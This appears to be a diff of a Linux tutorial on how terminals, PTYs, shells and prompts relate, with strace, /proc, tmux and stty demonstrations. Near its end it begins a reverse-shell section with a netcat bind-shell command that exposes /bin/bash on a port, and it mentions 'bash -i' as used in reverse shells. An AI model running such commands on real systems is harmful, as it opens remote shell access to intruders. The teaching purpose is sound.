-The only physical difference between your terminal session today and a session on an ASR-33 in 1969 is that output goes to pixels on a screen instead of ink on paper, and input comes from an electronic keyboard instead of a mechanical one. The kernel subsystem in between — the TTY driver, the line discipline, the PTY pair, the shell's loop, the prompt string — is the same abstraction, rebuilt in software, running unchanged for over 50 years.
-
----
-
-## Why a Terminal Is Always Related to a Shell — And Why They Are Not the Same Thing
-
-This is one of the most common confusions in computing. A terminal and a shell appear together so consistently that most people assume they are one thing. They are not. They are two completely independent concepts that became permanently bundled together by historical circumstance.
-
----
-
-### In the Beginning They Were Literally Different Machines
-
-In the 1960s and 1970s a terminal was a physical piece of hardware. The shell was a program running on a completely separate computer in another room or another building.
-
-```
-Physical setup in a university computing centre, 1972:
-
-Student's desk (terminal room):       Computer room (separate building):
-┌──────────────────────────┐          ┌──────────────────────────────┐
-│   DEC VT100 Terminal     │          │   PDP-11 Minicomputer        │
-│                          │          │                              │
-│  keyboard + screen       │          │   Running Unix               │
-│  no CPU                  │          │   Running sh (the shell)     │
-│  no memory               │          │   Running other programs     │
-│  no operating system     │          │                              │
-│  just display and input  │          │                              │
-└────────────┬─────────────┘          └──────────────────────────────┘
-             │                                       │
-             └──────── RS-232 serial cable ──────────┘
-```
-
-The terminal had no computing power at all. It was purely an input and output device. It encoded your keystrokes as bytes and sent them down the wire. It received bytes from the wire and displayed them on screen. That is all it did.
-
-The shell ran on the mainframe or minicomputer. When you logged in, the computer started a shell process for you. The shell sent its prompt bytes down the wire to your terminal. Your terminal displayed them. You typed, the terminal sent bytes to the shell, the shell processed them and sent output back, the terminal displayed it.
-
-```
-What the terminal knew:         What the shell knew:
-  "bytes came in on the wire"     "a command arrived"
-  "display these bytes"           "run this program"
-  "send these bytes out"          "send output back"
-
-The terminal had no idea a shell existed.
-The shell had no idea what physical terminal was on the other end.
-They communicated purely through byte streams.
-```
-
-The terminal was hardware. The shell was software on a remote machine. They had no inherent relationship — they were connected by a wire.
-
----
-
-### Why They Always Appear Together Today
-
-When personal computers arrived in the 1980s, people no longer needed separate terminal hardware. The computer had its own screen and keyboard. But the software model — a terminal talking to a shell — was so deeply embedded in Unix that it was kept intact.
-
-The physical terminal became a **terminal emulator** — a program that pretends to be hardware terminal. It uses the PTY mechanism to create a software terminal that the shell thinks is real hardware. The shell does not know or care that the terminal is software emulation rather than physical hardware.
-
-```
-1972:
-  Physical terminal ──serial wire──► shell on remote computer
-  Separate machines, separate locations, separate rooms
-
-Today:
-  Terminal emulator ──PTY pair──► shell on same computer
-  Both software, same machine, always started together
-
-The technical relationship is identical.
-The physical separation disappeared.
-The software separation remained — but nobody notices
-because they are always launched together.
-```
-
-Because the terminal emulator always launches a shell inside itself by convention, people began thinking of them as one thing. They are still two completely separate programs with a clean interface between them.
-
----
-
-### What Actually Connects Them — The PTY
-
-When you open GNOME Terminal on your machine, the sequence is:
-
-```
-1. GNOME Terminal starts (the terminal emulator program)
-
-2. Opens /dev/ptmx to get a PTY master fd
-   Creates: master fd (terminal emulator's end)
-            slave device /dev/pts/N (shell's end)
-
-3. Calls fork()
-
-4. Child process:
-   setsid()                 <- new session
-   open("/dev/pts/N")       <- open slave PTY
-   dup2(slave_fd, 0)        <- slave = stdin
-   dup2(slave_fd, 1)        <- slave = stdout
-   dup2(slave_fd, 2)        <- slave = stderr
-   execve("/bin/bash", ...) <- child BECOMES bash
-
-5. Parent (GNOME Terminal) enters event loop:
-   User presses key
-     -> terminal writes byte to master fd
-     -> line discipline processes it
-     -> bash reads from slave fd (its stdin)
-   Bash writes output
-     -> goes to slave fd (its stdout)
-     -> line discipline passes through
-     -> terminal reads from master fd
-     -> terminal renders characters on screen
-```
-
-Step 4 could execve any program — Python, MySQL, a custom application. GNOME Terminal would work identically. The PTY interface does not care what is on the other end.
-
----
-
-### The Terminal Can Connect to Things That Are Not Shells
-
-The terminal just sends and receives bytes. Whatever is at the other end can be anything:
-
-```bash
-# Terminal connected to a Python interpreter
-python3
-
-# Terminal connected to a database client
-mysql -u root -p
-
-# Terminal connected to a remote machine's shell over the network
-ssh user@remote.server.com
-
-# Terminal connected to a serial device (router, embedded system)
-screen /dev/ttyUSB0 115200
-
-# Terminal connected to a Docker container
-docker exec -it mycontainer /bin/bash
-
-# Terminal connected to a multiplexer managing many sessions
-tmux attach
-```
-
-In every case GNOME Terminal is doing the same job — sending your keystrokes and displaying bytes. What is on the other end varies completely.
-
----
-
-### The Shell Can Run Without a Terminal
-
-The shell has no requirement for a terminal. Scripts run this way every time:
-
-```bash
-# Shell runs a script with no terminal at all
-bash /etc/cron.daily/backup_script
-
-# SSH running a command non-interactively — no terminal allocated
-ssh user@server "df -h"
-
-# Systemd running a shell script as a service — no terminal
-ExecStart=/bin/bash /usr/local/bin/start_api.sh
-
-# Shell inside a pipeline — no terminal
-echo "SELECT * FROM users" | mysql -u root database
-```
-
-In all of these cases bash is running, parsing commands, executing programs — everything a shell does. There is no terminal. No prompt is printed because there is no human waiting. The shell's stdin is a file, a pipe, or a socket instead of a PTY.
-
-When no terminal is attached, the shell detects this with `isatty()` — the same function discussed in the TTY chapter. If `isatty(0)` returns false, stdin is not a terminal and the shell skips printing prompts and reading interactively.
-
----
-
-### Why the Shell Became the Default
-
-When Unix was designed in 1969, the shell was the only interactive program. There was no graphical interface, no integrated development environment, no database client with its own interface. If you wanted to do anything on the computer interactively, you used the shell.
-
-The terminal existed to give you access to the computer. The computer's interactive interface was the shell. Naturally, every terminal session started a shell. This convention became so universal that nobody ever questioned it.
-
-Terminal emulators are configured with a default program to launch. That default is always a shell — usually whatever is set as the user's login shell in `/etc/passwd`. Users never change this. Documentation always shows terminals with shells. The association hardened into assumption.
-
-But the configuration option exists precisely because the terminal and shell are separate:
-
-```bash
-# See what shell your terminal launches by default
-echo $SHELL                  # your login shell
-cat /etc/passwd | grep $(whoami)  # full entry including shell path
-
-# GNOME Terminal lets you change the default command
-# Preferences -> Profile -> Command -> "Run a custom command instead of shell"
-# You could put: python3
-# Or:            mysql -u root
-# Or:            /usr/local/bin/my_custom_program
-```
-
----
-
-### The Precise Relationship
-
-```
-TERMINAL EMULATOR                    SHELL (bash/zsh/fish)
-─────────────────────────────────    ────────────────────────────────
-A program (GNOME Terminal, iTerm2)   A program (bash, zsh, fish)
-Handles: display and input           Handles: command interpretation
-Knows about: bytes, escape codes,    Knows about: commands, files,
-  cursor movement, colours,            processes, variables,
-  window size, fonts                   environment, scripting
-Talks to: PTY master fd              Talks to: PTY slave fd
-Does not know what runs inside it    Does not know what terminal
-                                       it is connected to
-Connected by: PTY pair + N_TTY line discipline
-Both see a file descriptor
-Both read and write bytes
-Neither requires the other to exist
-```
-
-The terminal is the window and the wire. The shell is one possible program that lives at the other end of that wire — the most useful default, chosen by a 55-year-old convention, not by any technical requirement.
-
-
----
-
-## Exhaustive Proof — Terminal, Shell, Prompt and Reverse Shells
-
-Every claim in this section is proved with a runnable command and an explanation of exactly what the kernel and bash are doing at the system call level.
-
----
-
-### Part 1 — Proving a Shell Does Not Need a Terminal
-
-#### The strace Proof
-
-`strace` shows every system call a process makes. You can verify that bash's behaviour is identical regardless of whether stdin is a terminal, a file, or a pipe.
-
-```bash
-# Case 1: bash with a terminal attached — see the read() calls
-strace -e trace=read,write,ioctl bash 2>&1 | head -30
-# You will see ioctl() calls on fd 0 — bash checking terminal properties
-# You will see read(0, ...) blocking for your input
-
-# Case 2: bash with a pipe — same read() but no ioctl()
-echo 'ls' | strace -e trace=read,write,ioctl bash 2>&1 | head -30
-# No ioctl() calls — bash does not bother checking terminal properties
-# Still sees read(0, ...) but from the pipe
-
-# The difference: ioctl(0, TCGETS, ...) is the isatty() implementation
-# isatty() internally calls ioctl(fd, TCGETS, &termios)
-# If it succeeds -> fd is a terminal
-# If it fails with ENOTTY -> fd is not a terminal
-strace -e trace=ioctl bash -c 'ls' 2>&1 | grep TCGETS
-# Shows the isatty() check happening and failing (ENOTTY)
-```
-
-#### The /proc Proof — Seeing File Descriptor Types
-
-```bash
-# Start bash normally and check its file descriptors
-echo $$   # get bash PID
-ls -la /proc/$$/fd
-# Shows:
-# lrwxrwxrwx 1 leokadia leokadia 64 ... 0 -> /dev/pts/3
-# lrwxrwxrwx 1 leokadia leokadia 64 ... 1 -> /dev/pts/3
-# lrwxrwxrwx 1 leokadia leokadia 64 ... 2 -> /dev/pts/3
-# All three point to the PTY slave device
-
-# Now check bash running from a file
-bash /tmp/test.sh &
-BGPID=$!
-ls -la /proc/$BGPID/fd
-# Shows:
-# 0 -> /tmp/test.sh  (a regular file)
-# 1 -> /dev/pts/3    (inherited stdout from your terminal)
-# 2 -> /dev/pts/3    (inherited stderr)
-
-# Bash reading from a file — stdin is a file, not a terminal
-# bash never prints a prompt because isatty(0) returns false
-```
-
-#### The lsof Proof
-
-`lsof` (list open files) shows what each file descriptor is connected to with its type:
-
-```bash
-# Your current bash session
-lsof -p $$ | grep -E "^bash.*(0[uw]|1[uw]|2[uw])"
-# Shows type CHR (character device) for PTY — that is your terminal
-# Specific device: /dev/pts/N
-
-# Bash receiving input from a pipe
-sleep 100 | bash -c 'lsof -p $$ | head' &
-# Shows type PIPE for fd 0 — definitely not a terminal
-
-# Bash with redirected stdout
-bash -c 'lsof -p $$ | head' > /tmp/out.txt
-cat /tmp/out.txt
-# fd 1 shows type REG (regular file) pointing to /tmp/out.txt
-```
-
-#### Every Input Source Proven
-
-```bash
-# 1. Regular file as stdin
-cat > /tmp/cmds.sh << 'EOF'
-echo "I am running from a file"
-pwd
-whoami
-EOF
+# Method 1: stdin from a regular file
+echo 'echo "from file"; pwd; whoami' > /tmp/cmds.sh
 bash /tmp/cmds.sh
-# Works. No prompt. Commands execute silently.
+# Works. No prompt. No terminal.
 
-# 2. Pipe as stdin
-printf 'echo "from a pipe"\npwd\nwhoami\n' | bash
-# Works. No prompt. Commands execute silently.
+# Method 2: stdin from a pipe
+printf 'echo "from pipe"\nls /tmp\n' | bash
+# Works. No prompt. No terminal.
 
-# 3. Here string as stdin
-bash <<< 'echo "from a here string"'
+# Method 3: here string
+bash <<< 'echo "from here string"'
 # Works. No prompt.
 
-# 4. Here document as stdin
+# Method 4: here document
 bash << 'EOF'
-echo "from a here document"
+echo "from here document"
 ls /tmp | head -3
 EOF
 # Works. No prompt.
 
-# 5. Process substitution
+# Method 5: process substitution
 bash <(echo 'echo "from process substitution"')
 # Works. No prompt.
 
-# 6. /dev/stdin explicitly
-echo 'echo "from dev stdin"' | bash /dev/stdin
-# Works. No prompt.
-
-# 7. Named pipe (FIFO) as stdin
+# Method 6: named FIFO pipe
 mkfifo /tmp/myfifo
 bash < /tmp/myfifo &
-BASHPID=$!
-echo 'echo "from named pipe"' > /tmp/myfifo
-wait $BASHPID
-rm /tmp/myfifo
+BGPID=$!
+echo 'echo "from named pipe"; exit' > /tmp/myfifo
+wait $BGPID && rm /tmp/myfifo
 # Works. No prompt.
 
-# In all 7 cases: bash read commands from fd 0, executed them,
-# wrote output to fd 1. No terminal was involved or needed.
+# Method 7: -c flag (no stdin needed at all)
+bash -c 'echo "no stdin needed"'
+# Works. No prompt. stdin is not even read.
+
+# Proving with /proc — see what fd 0 is in each case:
+bash -c 'ls -la /proc/$$/fd | head -5'
+# fd 0 -> /dev/pts/N  (PTY when run from terminal)
+
+bash /tmp/cmds.sh &
+ls -la /proc/$!/fd | grep "^l.*0 ->"
+# fd 0 -> /tmp/cmds.sh  (regular file — no terminal)
 ```
 
----
+### Proof — Terminal Without Shell (4 Methods)
 
-### Part 2 — Proving a Terminal Does Not Need a Shell
-
-#### What the Terminal Emulator Actually Does
+A terminal emulator runs whatever program it is configured to run.
 
 ```bash
-# See what GNOME Terminal executes when you open it
-strace -f -e trace=execve gnome-terminal 2>&1 | grep execve
-# You will see execve("/bin/bash", ...) or whatever your login shell is
-# The terminal called execve() with bash — a configuration choice
+# Method 1: terminal running top
+xterm -e top &
+# xterm opened, top running inside
+# No shell, no bash, no prompt from a shell
+# top's own UI displays through the PTY
 
-# Change what gnome-terminal runs without changing anything else
-gnome-terminal -- python3
-# Opens terminal window, runs python3
-# You get >>> prompt from Python
-# No bash, no shell prompt, fully interactive
+# Method 2: terminal running Python
+xterm -e python3 &
+# Python REPL inside terminal
+# >>> prompt comes from Python, not from bash
+# isatty(0) returns true -> Python enters interactive mode
 
-gnome-terminal -- /usr/bin/top
-# Opens terminal window, runs top directly
-# No shell
+# Method 3: terminal running cat
+xterm -e cat &
+# No prompt at all
+# Type text -> it echoes back
+# Terminal passes bytes through PTY to cat, cat writes them back
 
-gnome-terminal -- /usr/bin/htop
-# Opens terminal window, runs htop directly
-# No shell
-
-gnome-terminal -- cat
-# Opens terminal window, runs cat
-# You type, it echoes
-# No shell, no prompt from bash
-```
-
-#### Proving the PTY Exists Regardless of What Runs Inside
-
-```bash
-# Even when running python3, a PTY is created
-gnome-terminal -- python3 &
-sleep 1
-# Find the python3 process and check its file descriptors
-PYPID=$(pgrep -n python3)
-ls -la /proc/$PYPID/fd | head -5
-# fd 0, 1, 2 all point to /dev/pts/N — the PTY slave
-# The terminal created the PTY and connected python3 to it
-# Python3 calls isatty(0) -> true -> enters interactive mode -> shows >>>
-
-# The terminal emulator holds the PTY master fd
-# python3 holds the PTY slave fd
-# The line discipline sits between them
-# This is identical to what happens with bash
-# The only difference is what program sits on the slave end
-```
-
-#### xterm Examples With Proof
-
-```bash
-# Terminal running a network tool — no shell
-xterm -e "nc -lvnp 9999" &
-# xterm created a PTY, ran netcat on the slave
-# Netcat is listening for connections
-# No shell
-
-# Terminal running ssh directly — shell is on the remote machine
-xterm -e "ssh user@remotehost" &
-# xterm creates PTY locally
-# SSH reads from PTY, encrypts, sends over network
-# Remote sshd creates another PTY on the remote side
-# Remote bash sits on the remote PTY slave
-# Two PTYs: one local (xterm-ssh), one remote (sshd-bash)
-# Two line disciplines
-# The local terminal has no shell at all
-
-# Terminal running a custom program
+# Method 4: terminal running a custom program
 cat > /tmp/my_repl.py << 'EOF'
-import sys
-print("My custom REPL — no shell")
+print("Custom REPL — zero shell involvement")
 while True:
     try:
         line = input("myrepl> ")
-        print(f"You typed: {line}")
+        print(f"You said: {line}")
     except EOFError:
         break
 EOF
 xterm -e "python3 /tmp/my_repl.py"
-# Custom prompt "myrepl> " from our Python code
-# No bash involved anywhere
+# "myrepl> " prompt from our Python code
+# No bash anywhere in the process tree
+
+# Proving the PTY exists regardless of what runs:
+xterm -e python3 &
+sleep 1
+PYPID=$(pgrep -n python3)
+ls -la /proc/$PYPID/fd | head -4
+# fd 0 -> /dev/pts/N  <- PTY slave, even though it is python3 not bash
+# Terminal created the PTY. Connected python3 to it. Done.
+```
+
+### Proof — Prompt Without Shell, Shell Without Prompt
+
+```bash
+# Prompt without bash — Python printing its own "prompt"
+python3 -c "
+import sys
+while True:
+    sys.stdout.write('myprompt> ')
+    sys.stdout.flush()
+    line = sys.stdin.readline()
+    if not line: break
+    print(f'Got: {line.strip()}')
+"
+# "myprompt> " appears before each input
+# This is just write() to stdout — same as bash's prompt
+# No shell involved
+
+# Shell without prompt
+PS1="" bash
+# Full bash, fully functional
+# isatty(0) still true -> interactive mode -> reads from terminal
+# But PS1 is empty -> write(1, "", 0) -> nothing visible
+# Commands still execute normally
+
+# Prove: strace shows write() is skipped for empty PS1
+strace -e trace=write bash 2>&1 | grep "write(1"
+# Shows: write(1, "user@host:~$ ", 13)  <- with normal PS1
+PS1="" strace -e trace=write bash 2>&1 | grep "write(1"
+# No write(1,...) for the prompt string
+# Shell still does write(1,...) for command output
+
+# Shell without prompt because it is not interactive
+bash script.sh
+# bash: isatty(0) = false -> interactive_mode = 0
+# The if(interactive_mode) block around write(PS1) never executes
+# Shell executes every command in the script silently
 ```
 
 ---
 
-### Part 3 — Proving the Prompt Is Just Printed Text
-
-#### PS1 Is Evaluated, Not Just Printed
-
-PS1 is not a static string — it is evaluated each time the prompt is displayed. This means it can contain dynamic content:
+## The PTY Creation Sequence — What Actually Happens When You Open a Terminal
 
 ```bash
-# PS1 can contain command substitutions (evaluated each prompt)
-PS1='$(date +%H:%M:%S) $ '
-# Every time you press Enter a new prompt shows the current time
-# bash calls: write(1, "10:23:45 $ ", 11) before each read()
+# Trace GNOME Terminal opening bash
+strace -f -e trace=openat,socket,ioctl,fork,execve gnome-terminal 2>&1 | \
+  grep -E "openat.*ptmx|ioctl.*PTYS|execve.*bash" | head -10
 
-# PS1 can show the current git branch
-PS1='$(git branch 2>/dev/null | grep "^*" | sed "s/* //") $ '
-# Every prompt evaluates the git command
-# Changes as you cd between repositories
-
-# PS1 can show exit code of last command
-PS1='[$(echo $?)] $ '
-# Shows [0] after success, [1] after failure
-
-# All of this is text that bash generates and writes to stdout
-# None of it is special — it is bytes written to fd 1
+# What you will see:
+# openat(AT_FDCWD, "/dev/ptmx", O_RDWR) = 5   <- opens PTY master
+# ioctl(5, TIOCSPTLCK, [0])                     <- unlocks slave
+# ioctl(5, TIOCGPTN, [3])                       <- gets slave number (pts/3)
+# [fork happens]
+# execve("/bin/bash", ...)                       <- child becomes bash
 ```
 
-#### Proving PS1 Is Just a write() Call
+Step by step in detail:
 
-```bash
-# strace bash and see exactly when and how PS1 is printed
-strace -e trace=write bash 2>&1 | grep -A1 "write(1"
-# You will see write(1, "user@host:~$ ", 13) = 13
-# Before every read(0, ...) call
-# That write() IS the prompt — nothing more
+```
+Step 1: GNOME Terminal calls open("/dev/ptmx", O_RDWR)
+        Returns master_fd (e.g. fd 5)
+        Kernel allocates a new PTY pair: master (fd 5) + slave (/dev/pts/3)
 
-# Prove it is optional
-PS1="" bash
-# No write() calls for prompts
-# Shell still runs every command correctly
-# strace would show read(0,...) with no preceding write(1,...)
+Step 2: GNOME Terminal calls grantpt(master_fd)
+        Sets correct ownership on /dev/pts/3
 
-# Prove any text works
-PS1="ANYTHING_HERE > " bash
-# strace shows write(1, "ANYTHING_HERE > ", 16)
-# The terminal displays that text
-# That is the entire mechanism of prompts
+Step 3: GNOME Terminal calls unlockpt(master_fd)
+        Allows the slave side to be opened
+
+Step 4: GNOME Terminal calls ptsname(master_fd)
+        Returns "/dev/pts/3" — the slave device path
+
+Step 5: GNOME Terminal calls fork()
+        Two processes now exist
+
+Step 6: Child process (future bash):
+        setsid()                        <- new session, child is session leader
+        open("/dev/pts/3", O_RDWR)      <- opens slave, becomes controlling terminal
+        dup2(slave_fd, STDIN_FILENO)    <- fd 0 = PTY slave
+        dup2(slave_fd, STDOUT_FILENO)   <- fd 1 = PTY slave
+        dup2(slave_fd, STDERR_FILENO)   <- fd 2 = PTY slave
+        close(master_fd)                <- child does not need master
+        execve("/bin/bash", ...)        <- child BECOMES bash
+
+Step 7: Parent (GNOME Terminal) enters event loop:
+        read(master_fd, ...) -> receive bash output -> render in window
+        write(master_fd, ...) -> send keystrokes -> line discipline -> bash
+
+Step 8: bash starts:
+        isatty(STDIN_FILENO) -> ioctl(0, TCGETS) -> success -> true
+        interactive_mode = 1
+        write(STDOUT_FILENO, PS1_evaluated, len) <- THE PROMPT APPEARS
+        read(STDIN_FILENO, ...) <- BLOCKS waiting for input
 ```
 
-#### Interactive vs Non-Interactive vs Login Shell
+The prompt appears at step 8. Every component before it — PTY creation, fork, exec, session setup — happens invisibly.
 
-These are three distinct concepts that are frequently confused:
+---
 
-```bash
-# Interactive shell: reads commands from a terminal (isatty(0)=true)
-# or was started with -i flag
-bash -i                    # forced interactive even if stdin is not TTY
-bash                       # interactive if stdin is TTY
+## Interactive vs Non-Interactive vs Login Shell
 
-# Non-interactive shell: reads from file, pipe, etc.
-bash script.sh             # non-interactive
-echo 'ls' | bash           # non-interactive
-bash -c 'ls'               # non-interactive
+Three orthogonal properties that are frequently confused:
 
-# Login shell: first shell when you log in (reads /etc/profile, ~/.bash_profile)
-bash -l                    # login shell
-bash --login               # same
-# Indicated by: echo $0 shows "-bash" (leading dash) in a real login shell
+```
+INTERACTIVE: reads commands from a human (isatty(0)=true or -i flag)
+  YES: prints prompts, reads readline, has command history, job control
+  NO:  no prompts, reads commands silently, exits when done
 
-# The four combinations:
-bash -i                    # interactive non-login
-bash -l                    # non-interactive login (unusual)
-bash -il                   # interactive login (normal login session)
-bash script.sh             # non-interactive non-login (script)
+NON-INTERACTIVE: reads commands from a file, pipe, -c flag
+  Does not print prompts
+  Does not set up readline or history
+  Exits after last command
 
-# What each reads at startup:
-# Login:        /etc/profile, ~/.bash_profile (or ~/.bash_login, ~/.profile)
-# Interactive:  ~/.bashrc
-# Both:         both sets of files
-# Neither:      nothing (fastest startup)
+LOGIN: the first shell when a user session begins
+  Reads /etc/profile, ~/.bash_profile (or ~/.profile)
+  Indicated by: echo $0 shows "-bash" (leading dash)
+
+COMBINATIONS:
+  bash              -> interactive non-login   (terminal session)
+  bash -l           -> non-interactive login   (unusual)
+  bash -il          -> interactive login       (SSH session, console login)
+  bash script.sh    -> non-interactive non-login (script)
+  ssh host          -> interactive login on remote host
+
+WHAT EACH READS AT STARTUP:
+  Login shell:       /etc/profile, ~/.bash_profile
+  Interactive only:  ~/.bashrc
+  Both:              all of the above
+  Neither:           nothing (fastest startup)
 ```
 
-#### SIGHUP — What Happens When the Terminal Closes
+```bash
+# Prove which mode you are in
+[[ $- == *i* ]] && echo "interactive" || echo "non-interactive"
+[[ "$0" == "-bash" ]] && echo "login" || echo "non-login"
 
-When a terminal emulator window is closed, the kernel sends SIGHUP (Signal Hangup — named after the modem hangup signal from the teletype era) to the foreground process group of that terminal's session:
+# Force interactive mode without TTY
+bash -i < /dev/null
+# bash: isatty(0)=false but -i forces interactive_mode=1
+# Prompt is printed to stderr (since stdout might not be a terminal)
+# This is what "bash -i" in reverse shells does
+```
+
+---
+
+## SIGHUP — What Happens When the Terminal Closes
+
+When a terminal emulator window is closed, the PTY master fd is closed. The kernel detects the master side is gone and sends **SIGHUP** (Signal Hangup — named after the telephone modem hangup in the teletype era) to the foreground process group of that terminal's session.
 
 ```bash
-# Demonstrate SIGHUP
-bash -c 'trap "echo SIGHUP received >> /tmp/sighup_test" SIGHUP; sleep 30' &
+# Default SIGHUP behaviour: terminate the process
+# Prove it:
+bash -c 'trap "echo SIGHUP >> /tmp/sighup_test" SIGHUP; sleep 30' &
 BGPID=$!
-# Now close the terminal or kill the PTY
-# The sleeping process receives SIGHUP and writes to the file
+# Close the terminal or kill the PTY master
+kill -SIGHUP $BGPID
+cat /tmp/sighup_test
+# SIGHUP
 
-# nohup prevents SIGHUP from killing your process
-nohup long_running_command &
-# nohup redirects stdin to /dev/null, stdout/stderr to nohup.out
-# Installs a SIGHUP ignore handler
+# nohup: ignore SIGHUP and redirect output
+nohup long_command &
+# Installs SIG_IGN handler for SIGHUP
+# Redirects stdin to /dev/null
+# Redirects stdout/stderr to nohup.out
 # Process continues after terminal closes
 
-# Prove nohup with strace
-strace nohup bash -c 'sleep 10' 2>&1 | grep -E "signal|SIGHUP|open"
-# Shows: open("nohup.out", ...) - creating the output file
-# Shows: sigaction(SIGHUP, {SIG_IGN}) - ignoring SIGHUP
+# disown: remove job from shell's job table (shell will not send SIGHUP)
+long_command &
+disown
+# Shell no longer tracks this job
+# Shell will not send SIGHUP to it when shell exits
+
+# screen/tmux: survive terminal closure by design
+# tmux server holds the PTY master fd — it never closes
+# Terminal emulator holds a client connection to tmux server
+# Close terminal -> client disconnects, server keeps PTY alive
+# New terminal -> new client attaches to same server -> same PTY
 ```
 
 ---
 
-### Part 4 — The isatty() Mechanism in Full Detail
+## screen and tmux — Two PTY Layers
 
-#### What isatty() Actually Does in the Kernel
+`screen` and `tmux` create their own PTY pairs, sitting between your terminal emulator and your shell. This is why they survive terminal closure.
 
-```bash
-# isatty() is implemented as a single ioctl() call
-# Verify this by looking at glibc source or using strace
+```
+Without tmux (one PTY):
+  GNOME Terminal (master) <--PTY pair A--> bash (slave)
+  Close terminal: PTY pair A destroyed, bash gets SIGHUP, bash dies
 
-strace bash -c '' 2>&1 | grep -i "ioctl.*TCGETS\|isatty"
-# You will see: ioctl(0, TCGETS, {B38400 opost isig icanon echo ...}) = 0
-# Return value 0 means success -> fd 0 IS a terminal
-# Return value -1 with errno=ENOTTY means NOT a terminal
+With tmux (two PTY layers):
+  GNOME Terminal (master) <--PTY pair A--> tmux client (slave)
+  tmux server (master)    <--PTY pair B--> bash (slave)
 
-# When stdin is a pipe:
-echo '' | strace bash -c '' 2>&1 | grep "TCGETS"
-# ioctl(0, TCGETS, 0x...) = -1 ENOTTY (Inappropriate ioctl for device)
-# bash sees ENOTTY -> isatty() returns 0 -> not interactive
+  Close terminal:
+    PTY pair A destroyed
+    tmux client disconnects from server
+    PTY pair B is untouched — server still holds master fd
+    bash is still running, connected to PTY pair B slave
+    No SIGHUP sent to bash
 
-# You can call isatty() yourself in Python
-python3 -c "
-import os, sys
-print('stdin is TTY:', os.isatty(0))
-print('stdout is TTY:', os.isatty(1))
-" | cat
-# stdin is TTY: False  (piped into cat)
-# stdout is TTY: False (piped from python)
+  Reattach:
+    New terminal opens
+    New PTY pair A: new terminal <--> tmux client
+    tmux client reconnects to server
+    Server renders current bash state in new terminal
+    Everything continues exactly where it left off
 
-python3 -c "
-import os
-print('stdin is TTY:', os.isatty(0))
-print('stdout is TTY:', os.isatty(1))
-"
-# stdin is TTY: True   (connected to PTY)
-# stdout is TTY: True  (connected to PTY)
+# Prove two PTY layers:
+tmux new-session -d -s test
+tmux send-keys -t test "tty" Enter
+tmux capture-pane -t test -p
+# Shows /dev/pts/N — the PTY that tmux server allocated for bash
+
+ls /proc/$(pgrep -f "tmux: server")/fd 2>/dev/null | wc -l
+# Many fds — one PTY master per window/pane
 ```
 
-#### The tty Command — Showing Your Current Terminal
+---
+
+## stty — Terminal Settings That Control the Line Discipline
+
+`stty` shows and modifies the line discipline settings attached to a TTY fd. These settings determine what the line discipline does with each byte.
 
 ```bash
-# Show which PTY device your shell is connected to
-tty
-# Output: /dev/pts/3 (or whatever PTY was allocated)
-
-# In a non-interactive context:
-echo 'tty' | bash
-# Output: not a tty
-# bash's stdin is the pipe, not a PTY
-
-# Each terminal window gets its own PTY
-# Open three terminal windows and run tty in each:
-# Window 1: /dev/pts/0
-# Window 2: /dev/pts/1
-# Window 3: /dev/pts/2
-# Each is a separate PTY pair in the kernel
-
-# See all active PTY slaves
-ls -la /dev/pts/
-# crw--w---- 1 leokadia tty 136, 0 ... pts/0
-# crw--w---- 1 leokadia tty 136, 1 ... pts/1
-# crw--w---- 1 leokadia tty 136, 2 ... pts/2
-# c = character device
-# major 136 = PTY slave device
-```
-
-#### stty — Terminal Settings Inherited by Shells
-
-`stty` shows and modifies the line discipline settings. These settings are properties of the PTY, not of bash:
-
-```bash
-# See all current terminal settings
+# See all current settings
 stty -a
-# Output shows:
+# Output:
 # speed 38400 baud; rows 40; columns 180;
-# intr = ^C; quit = ^\; erase = ^?; kill = ^U;
-# start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R;
-# ...flags: -parenb -parodd ... icanon isig echo echoe echok...
+# intr = ^C;    <- Ctrl-C sends SIGINT
+# quit = ^\;    <- Ctrl-\ sends SIGQUIT
+# erase = ^?;   <- Backspace erases last char
+# kill = ^U;    <- Ctrl-U erases entire line
+# eof = ^D;     <- Ctrl-D signals end of input
+# susp = ^Z;    <- Ctrl-Z sends SIGTSTP
+# start = ^Q;   <- Ctrl-Q resumes output (XON)
+# stop = ^S;    <- Ctrl-S pauses output (XOFF)
+# Flags: icanon isig echo echoe echok ...
+# icanon = buffer lines until Enter (cooked mode)
+# isig   = process signal characters (Ctrl-C etc)
+# echo   = echo input back to screen
 
-# Key settings explained:
-# icanon = canonical (cooked) mode — buffer lines until Enter
-# isig   = interpret signal chars (Ctrl-C sends SIGINT)
-# echo   = echo input characters back to screen
-# intr=^C = Ctrl-C is the interrupt character
+# Settings are inherited by child processes
+stty -a | grep "intr"       # intr = ^C
+bash -c 'stty -a | grep intr'  # intr = ^C  <- child inherited it
 
-# These settings live in the PTY slave's line discipline
-# They are inherited when bash forks a child process
-# A child process has the same PTY slave fd -> same settings
-
-# Prove inheritance:
-stty -a | grep "intr"
-# intr = ^C
-
-bash -c 'stty -a | grep "intr"'
-# intr = ^C   <- child bash inherited the same settings
-
-# Reverse shells break because:
-# The TCP socket has NO stty settings
-# No line discipline -> no canonical mode -> no signal chars
-# Ctrl-C sends bytes "^C" instead of raising SIGINT
+# Settings explain why dumb reverse shells break:
+# TCP socket has NO stty settings
+# No line discipline -> no icanon -> no isig -> no echo
+# Ctrl-C sends literal 0x03 bytes instead of raising SIGINT
+# Arrow keys send ESC sequences that print as garbage
+# No buffer means every keystroke sent immediately (no editing)
 ```
 
 ---
 
-### Part 5 — screen and tmux — Programs That Create Their Own PTYs
+## Reverse Shells — Shell I/O Over a Network
 
-`screen` and `tmux` are multiplexers. They sit between your terminal emulator and your shell, creating their own PTY pairs. Understanding this explains why they survive terminal closure and why you can attach from a different terminal.
+A reverse shell is a shell whose file descriptors are connected to a network socket. This directly applies every concept above.
 
-```bash
-# When you run tmux:
-# 1. tmux server starts (if not already running) — a daemon
-# 2. tmux client connects to server via Unix domain socket
-# 3. tmux server creates a NEW PTY pair for the shell
-# 4. tmux server forks bash and connects it to the new PTY slave
-# 5. tmux client renders the bash output in your terminal
+### Why It Is Called Reverse
 
-# The PTY hierarchy:
-# Your terminal emulator -> PTY pair A -> tmux client
-# tmux server -> PTY pair B -> bash
+```
+Bind shell (target listens, attacker connects):
+  Target:   nc -lvnp 4444 -e /bin/bash
+  Attacker: nc target_ip 4444
+  Problem:  firewall blocks inbound connections to target
 
-# PTY pair A: between terminal emulator and tmux client
-# PTY pair B: between tmux server and bash
-
-# When you close the terminal emulator:
-# PTY pair A is destroyed
-# tmux client disconnects from server
